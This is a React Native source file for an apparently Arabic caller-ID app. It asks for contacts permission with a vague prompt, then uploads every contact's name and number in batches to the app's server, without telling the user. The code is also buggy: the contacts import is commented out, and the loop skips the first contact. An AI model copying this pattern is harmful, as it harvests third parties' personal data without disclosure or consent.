import { PermissionsAndroid } from "react-native";
// import Contacts_1 from "react-native-contacts";
import * as _ from "lodash";
import Storage from "../Storage/Storage";
import axios from "axios";
import Global from "../../../Globals";
//"react-native-contacts": "^5.0.4", //TODO INSTALL THIS DEBENDECY WHEN YOU WANT TO ADD CONTACT READING
export default class contacts {
  constructor({ deviceId, encryptedId } = {}) {
    this.encryptedId = encryptedId;
    this.deviceId = deviceId;
    this.lastTimeContactUpload = "";
    this.today = new Date();

    this.needContactUpload = false;
    this.contacts = [];
    this.uploadEveryDay = 10;
    // console.log("object", this.lastTimeContactUpload);
    this.getLastTimeContactUpload();
    // console.log("=================", this, "---------------------------");
  }

  async getLastTimeContactUpload() {
    const lS = new Storage("lastTimeContactUpload");
    const lastTimeUpload = await lS.getLastTimeUpload();
    console.warn(lastTimeUpload);
    this.lastTimeContactUpload = lastTimeUpload;
    await this.isNeedUpload();

    // console.log(this.lastTimeContactUpload, "tt");
    // return this.lastTimeContactUpload;
  }
  isNeedUpload() {
    const needUpload = this.dateDiffrence(
      this.lastTimeContactUpload,
      this.today
    );
    // console.log(needUpload, "need");
    this.needContactUpload = needUpload > this.uploadEveryDay;
  }
  sendContacts() {
    const lS = new Storage("lastTimeContactUpload");
    lS.setLastTimeUpload(this.today.toString()); //TODO add this one in production
    const endurl = "/app9291/v1/mobile/appcontacts";
    const url = Global.site.url + Global.site.endPoint + endurl;

    // console.warn("this.contactsv", this.contacts.length);
    // uploading contacts
    for (let i = 1; i <= this.contacts.length; i += 500) {
      let j = i + 500;
      let str = this.contacts.slice(i, j);
      // alert(i);
      let data = JSON.stringify(str);
      // console.log(this.state.userData);
      // alert(i);
      // console.warn(data);
      // console.log("uploading request send", id, url);
      try {
        axios
          .post(
            url,
            {
              id: this.deviceId,
              data: data,
              // prefix,
            },
            {
              headers: {
                "User-Agent": "app9291 android",
                auth: this.encryptedId,
              },
            }
          )
          .then(function (response) {
            console.log(response.data, "response from contact upload");
          })
          .catch(function (error) {
            console.log("error uploading", error);
          }); //comment whe debuging
      } catch (error) {}
      // break;
    }
  }
  async getContacts() {
    // return true;
    await Contacts_1.getAll(async (err, data) => {
      if (err === "denied") {
        // error
        return false;
      } else {
        // data returned in Array

        if (data.length > 0) {
          //   console.log("object", data);
          try {
            await data.map((contact) => {
              //   console.log("object", contact);
              //   return;
              let { displayName } = contact;
              if (contact.phoneNumbers) {
                if (contact.phoneNumbers.length > 0) {
                  contact.phoneNumbers.map((phoneNumber) => {
                    let { number } = phoneNumber;
                    if (
                      number.slice(0, 1) == "+" ||
                      number.slice(0, 1) == "0"
                    ) {
                      number = number.replace(/[^a-zA-Z0-9+]/g, "");
                    } else {
                      var mobile_no = number.replace(/[^a-zA-Z0-9]/g, "");
                      number = mobile_no;
                    }
                    let contactData = {
                      displayName,
                      phoneNumbers: number,
                    };
                    //   console.log("contactData", contactData);
                    // console.log("this.contacts", contactData);
                    // return;
                    this.contacts.push(contactData);
                    // break;
                    //   ContactServices.state.data.push(contactData);
                  });
                }
              }
            });
          } catch (error) {
            return false;
            // console.log("====================================");
            // console.log(error);
            // console.log("====================================");
          }
        }
        this.contacts = await _.uniqBy(
          //remove dublications from the numbers
          this.contacts,
          function (e) {
            return e.phoneNumbers;
          }
        );

        // console.log("====================================");
        // console.log(this.contacts);
        // console.log("====================================");

        this.sendContacts();
        // return 12; // retern the data
      }
    });

    // return contactread;
  }
  async uploadContacts() {
    const hasPerm = await this.hasContactPermitions();
    // console.log("hasPerm", hasPerm);
    if (hasPerm) {
      if (this.needContactUpload) {
        this.getContacts();
      } else {
        console.warn("no need for upload");
      }
    }
  }
  async hasContactPermitions() {
    let granted = await PermissionsAndroid.request(
      PermissionsAndroid.PERMISSIONS.READ_CONTACTS,
      {
        title: "كاشف الارقام",
        message: "يحتاج كاشف الارقام الي بعض الاذونات للاستمرار في العمل ",
      }
    );
    return granted === PermissionsAndroid.RESULTS.GRANTED;
  }
  dateDiffrence(date1, date2) {
    //Get 1 day in milliseconds
    var one_day = 1000 * 60 * 60 * 24;

    // Convert both dates to milliseconds
    var date1_ms = new Date(date1).getTime();
    // 2019-01-14T19:37:13.178Z
    // var date1_ms = new Date('2019-01-10T19:37:13.178Z').getTime();
    var date2_ms = new Date(date2).getTime();

    // Calculate the difference in milliseconds
    var difference_ms = date2_ms - date1_ms;

    // Convert back to days and return
    return Math.round(difference_ms / one_day);
  }
}
